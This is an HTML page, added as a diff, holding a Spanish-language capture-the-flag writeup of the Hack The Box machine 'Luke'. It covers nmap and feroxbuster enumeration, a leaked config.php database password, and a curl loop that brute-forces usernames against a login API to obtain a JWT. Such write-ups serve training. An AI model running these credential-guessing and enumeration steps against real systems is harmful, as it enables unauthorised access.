@@ -1,0 +1,385 @@
+<!doctype html>
+<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Bajo el teclado</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="" />
+
+    
+    
+    
+    <link rel="stylesheet" href="../../css/theme.min.css">
+
+    
+    
+    
+
+    
+  
+
+
+</head>
+<body>
+        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
+    <div class="row">
+        
+        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
+            <a href="../../" class="text-decoration-none">
+                <img id="home-image" class="rounded-circle"
+                    
+                        
+                            src="../../pointed.png"
+                        
+                    
+                />
+            </a>
+        </div>
+        <div class="col-sm-8 col-12 text-sm-left text-center">
+        
+            <h2 class="m-0 mb-2 mt-4">
+                <a href="../../" class="text-decoration-none">
+                    
+                        pointedsec
+                    
+                </a>
+            </h2>
+            <p class="text-muted mb-1">
+                
+                    if pentester.found == bug { make(pentester,states.happy) }
+                
+            </p>
+            <ul id="nav-links" class="list-inline mb-2">
+                
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../about/" title="About">About</a>
+                    </li>
+                
+                    <li class="list-inline-item">
+                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
+                    </li>
+                
+            </ul>
+            <ul id="nav-social" class="list-inline">
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="http://github.com/pointedsec" target="_blank">
+                            <i class="fab fa-github fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
+                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
+                            <i class="fas fa-at fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://pointedsec.vercel.app" target="_blank">
+                            <i class="fas fa-globe fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+                    <li class="list-inline-item mr-3">
+                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
+                            <i class="fas fa-box fa-1x text-muted"></i>
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+    <hr />
+</header>
+<div class="container">
+    <div class="pl-sm-4 ml-sm-5">
+        <h1 id="hack-the-box-luke-writeup">Hack The Box: Luke Writeup</h1>
+<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;Luke&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.96.55 --ulimit <span style="color:#ae81ff">5000</span> -g 
+</span></span><span style="display:flex;"><span>10.129.96.55 -&gt; <span style="color:#f92672">[</span>21,22,80,3000,8000<span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p21,22,80,3000,8000 -sCV 10.129.96.55 -oN allPorts
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 22:29 CEST
+</span></span><span style="display:flex;"><span>Stats: 0:02:18 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 80.00% <span style="color:#66d9ef">done</span>; ETC: 22:32 <span style="color:#f92672">(</span>0:00:35 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.96.55
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp   open  ftp     vsftpd 3.0.3+ <span style="color:#f92672">(</span>ext.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to 10.10.14.18
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session upload bandwidth limit
+</span></span><span style="display:flex;"><span>|      No session download bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3+ <span style="color:#f92672">(</span>ext.1<span style="color:#f92672">)</span> - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">512</span> Apr <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> webapp
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh?
+</span></span><span style="display:flex;"><span>|_ssh-hostkey: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.38 <span style="color:#f92672">((</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.3.3<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Luke
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.38 <span style="color:#f92672">(</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.3.3
+</span></span><span style="display:flex;"><span>3000/tcp open  http    Node.js Express framework
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>application/json; charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>8000/tcp open  http    Ajenti http control panel
+</span></span><span style="display:flex;"><span>|_http-title: Ajenti
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 182.03 seconds
+</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.96.55 -oN allPorts.UDP
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-05 22:33 CEST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.96.55
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.055s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>All <span style="color:#ae81ff">1500</span> scanned ports on 10.129.96.55 are in ignored states.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1305</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">195</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.80 seconds
+</span></span></code></pre></div><h1 id="ftp-enumeration">FTP Enumeration</h1>
+<p>Podemos iniciar sesión de forma anónima en el FTP, encontramos un archivo llamado <code>for_Chihiro.txt</code></p>
+<pre tabindex="0"><code>Dear Chihiro !!
+
+As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
+the actual website I&#39;ve created .
+Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
+
+Derry
+</code></pre><p>De este mensaje podemos sacar la conclusión de que existen dos usuarios, <code>chihiro</code> y <code>derry</code> y de que en alguna parte debe de haber recursos que no deberían de estar debido a las políticas de seguridad.</p>
+<h1 id="80tcp-enumeration">80/TCP Enumeration</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.96.55
+</span></span><span style="display:flex;"><span>http://10.129.96.55 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.38<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>contact@luke.io<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>FreeBSD<span style="color:#f92672">][</span>Apache/2.4.38 <span style="color:#f92672">(</span>FreeBSD<span style="color:#f92672">)</span> PHP/7.3.3<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.129.96.55<span style="color:#f92672">]</span>, JQuery, PHP<span style="color:#f92672">[</span>7.3.3<span style="color:#f92672">]</span>, Script, Title<span style="color:#f92672">[</span>Luke<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Encontramos el dominio <code>luke.io</code></p>
+<p>Vemos que se está utilizando PHP por detrás.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://10.129.96.55 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -d <span style="color:#ae81ff">2</span> -t <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>                                                                                          
+</span></span><span style="display:flex;"><span> ___  ___  __   __     __      __         __   ___
+</span></span><span style="display:flex;"><span>|__  |__  |__<span style="color:#f92672">)</span> |__<span style="color:#f92672">)</span> | /  <span style="color:#e6db74">`</span>    /  <span style="color:#ae81ff">\ \_</span>/ | |  <span style="color:#ae81ff">\ </span>|__
+</span></span><span style="display:flex;"><span>|    |___ |  <span style="color:#ae81ff">\ </span>|  <span style="color:#ae81ff">\ </span>| <span style="color:#ae81ff">\_</span>_,    <span style="color:#ae81ff">\_</span>_/ / <span style="color:#ae81ff">\ </span>| |__/ |___
+</span></span><span style="display:flex;"><span>by Ben <span style="color:#e6db74">&#34;epi&#34;</span> Risher 🤓                 ver: 2.10.4
+</span></span><span style="display:flex;"><span>───────────────────────────┬──────────────────────
+</span></span><span style="display:flex;"><span> 🎯  Target Url            │ http://10.129.96.55
+</span></span><span style="display:flex;"><span> 🚀  Threads               │ <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span> 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span> 👌  Status Codes          │ All Status Codes!
+</span></span><span style="display:flex;"><span> 💥  Timeout <span style="color:#f92672">(</span>secs<span style="color:#f92672">)</span>        │ <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span> 🦡  User-Agent            │ feroxbuster/2.10.4
+</span></span><span style="display:flex;"><span> 🔎  Extract Links         │ true
+</span></span><span style="display:flex;"><span> 💲  Extensions            │ <span style="color:#f92672">[</span>php<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> 🏁  HTTP methods          │ <span style="color:#f92672">[</span>GET<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> 🔃  Recursion Depth       │ <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>───────────────────────────┴──────────────────────
+</span></span><span style="display:flex;"><span> 🏁  Press <span style="color:#f92672">[</span>ENTER<span style="color:#f92672">]</span> to use the Scan Management Menu™
+</span></span><span style="display:flex;"><span>──────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">404</span>      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">403</span>      GET        9l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       29l       99w      927c http://10.129.96.55/js/scrolling-nav.js
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       40l       77w      793c http://10.129.96.55/css/signin.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       12l       32w      323c http://10.129.96.55/css/scrolling-nav.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        7l      965w    76308c http://10.129.96.55/vendor/bootstrap/js/bootstrap.bundle.min.js
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        6l     1429w   121200c http://10.129.96.55/css/bootstrap.min.css
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        7l       20w      235c http://10.129.96.55/member <span style="color:#f92672">=</span>&gt; http://10.129.96.55/member/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       39l      118w     1593c http://10.129.96.55/login.php
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">401</span>      GET       12l       46w      381c http://10.129.96.55/management
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        7l       20w      232c http://10.129.96.55/css <span style="color:#f92672">=</span>&gt; http://10.129.96.55/css/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        7l       20w      231c http://10.129.96.55/js <span style="color:#f92672">=</span>&gt; http://10.129.96.55/js/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">301</span>      GET        7l       20w      235c http://10.129.96.55/vendor <span style="color:#f92672">=</span>&gt; http://10.129.96.55/vendor/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        6l       25w      202c http://10.129.96.55/config.php
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET      108l      240w     3138c http://10.129.96.55/
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET       21l      172w     1093c http://10.129.96.55/LICENSE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">404</span>      GET        7l       25w      203c http://10.129.96.55/%20.php
+</span></span><span style="display:flex;"><span>🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_96_55-1722890241.state ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">##&gt;-----------------] - 17s    22962/220575  3m      found:15      errors:20     </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">#&gt;------------------] - 17s    11436/220545  688/s   http://10.129.96.55/ </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s    220545/220545  926660/s http://10.129.96.55/css/ =&gt; Directory listing</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s    220545/220545  2864221/s http://10.129.96.55/vendor/ =&gt; Directory listing</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s    220545/220545  5513625/s http://10.129.96.55/member/ =&gt; Directory listing</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 0s    220545/220545  5513625/s http://10.129.96.55/js/ =&gt; Directory listing</span>
+</span></span></code></pre></div><p>Vemos una ruta <code>/management</code> y otra <code>/member</code> que me llaman la atención.</p>
+<p>Vemos un <code>config.php</code> que sospechosamente nos reporta que tiene contenido.</p>
+<p>Genial..</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://10.129.96.55/config.php
+</span></span><span style="display:flex;"><span>$dbHost <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>;
+</span></span><span style="display:flex;"><span>$dbUsername <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;root&#39;</span>;
+</span></span><span style="display:flex;"><span>$dbPassword  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Zk6heYCyv6ZE9Xcg&#39;</span>;
+</span></span><span style="display:flex;"><span>$db <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;login&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$conn <span style="color:#f92672">=</span> new mysqli<span style="color:#f92672">(</span>$dbHost, $dbUsername, $dbPassword,$db<span style="color:#f92672">)</span> or die<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Connect failed: %s\n&#34;</span>. $conn -&gt; error<span style="color:#f92672">)</span>;
+</span></span></code></pre></div><p>Tenemos una credencial <code>Zk6heYCyv6ZE9Xcg</code>
+No sabemos para qué aún.</p>
+<p>No consigo iniciar sesión en este panel.
+<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
+<p>El endpoint de <code>/management</code> también está protegido y no consigo iniciar sesión.
+<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
+<p>La ruta <code>/member</code> está vacia.</p>
+<h1 id="3000tcp--8000tcp">3000/TCP &amp; 8000/TCP</h1>
+<p>Por el puerto :3000 parece que hay una API por detrás.
+<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
+<p>Por el puerto :8000 hay un CMS llamado Ajenti.
+<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
+<p>Hay varias vulnerabilidades asociadas a Ajenti, pero necesito estar autenticado.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Decidí investigar un poco mas la API.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X GET http://10.129.96.55:3000 -H <span style="color:#e6db74">&#39;Authorization: test&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;success&#34;</span>:false,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is not valid&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Intenté varias cosas pero nada funcionó, así que vamos a fuzzear a ver si encontramos algún endpoint curioso.</p>
+<p><img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Vemos un endpoint <code>/users</code> pero necesito estar autenticado</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X GET http://10.129.96.55:3000/users -H <span style="color:#e6db74">&#39;Authorization: &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;success&#34;</span>:false,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Auth token is not supplied&#34;</span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=root&amp;password=test&#34;</span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;user=root&amp;password=test&#34;</span>
+</span></span><span style="display:flex;"><span>Bad Request┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=root&amp;password=test&#34;</span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Deduzco que la data se la tengo que mandar en formato <code>x-www-form-urlencoded</code> y que los campos son <code>username</code> y <code>password</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=root&amp;password=test&#34;</span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;user=root&amp;password=test&#34;</span>
+</span></span><span style="display:flex;"><span>Bad Request┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=root&amp;password=test&#34;</span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Intento iniciar sesión con las credenciales que ya tenía.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=root&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
+</span></span><span style="display:flex;"><span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=chihiro&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
+</span></span><span style="display:flex;"><span>Forbidden┌─<span style="color:#f92672">[</span>192.168.1.52<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>pointedsec@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/Desktop/luke/content<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└──╼ <span style="color:#f92672">[</span>★<span style="color:#f92672">]</span>$ curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=derry&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>
+</span></span><span style="display:flex;"><span>Forbidden
+</span></span></code></pre></div><p>Y nada. Así que probé a hacer una pequeña fuerza bruta&hellip;</p>
+<p>Y sorprendentemente funcionó.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ <span style="color:#66d9ef">for</span> username in <span style="color:#66d9ef">$(</span>cat /opt/SecLists/Usernames/cirt-default-usernames.txt | awk <span style="color:#e6db74">&#39;{print tolower($0)}&#39;</span><span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34; -&gt; </span>$username<span style="color:#e6db74">&#34;</span>; curl -X POST http://10.129.96.55:3000/login --data <span style="color:#e6db74">&#34;username=</span>$username<span style="color:#e6db74">&amp;password=Zk6heYCyv6ZE9Xcg&#34;</span>; <span style="color:#66d9ef">done</span>
+</span></span><span style="display:flex;"><span> -&gt; !root
+</span></span><span style="display:flex;"><span>Forbidden -&gt; $aloc$
+</span></span><span style="display:flex;"><span>Forbidden -&gt; $srv
+</span></span><span style="display:flex;"><span>Forbidden -&gt; $system
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#f92672">(</span>null<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#f92672">(</span>any<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#f92672">(</span>created<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">11111111</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; 12.x
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">1502</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">18140815</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; 1nstaller
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">22222222</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">31994</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; 4dgifts
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; 6.x
+</span></span><span style="display:flex;"><span>Forbidden -&gt; <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>Forbidden -&gt; adams
+</span></span><span style="display:flex;"><span>Forbidden -&gt; adldemo
+</span></span><span style="display:flex;"><span>Forbidden -&gt; admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;success&#34;</span>:true,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Authentication successful!&#34;</span>,<span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzIyODg0MDU2LCJleHAiOjE3MjI5NzA0NTZ9.FyEpFhkz8V0rIXmjcegdmvZ2sXIdPO-OMdVa6OD0C_Y&#34;</span><span style="color:#f92672">}</span> -&gt; administrator
+</span></span></code></pre></div><p>Ahora podemos ver mas usuarios&hellip;</p>
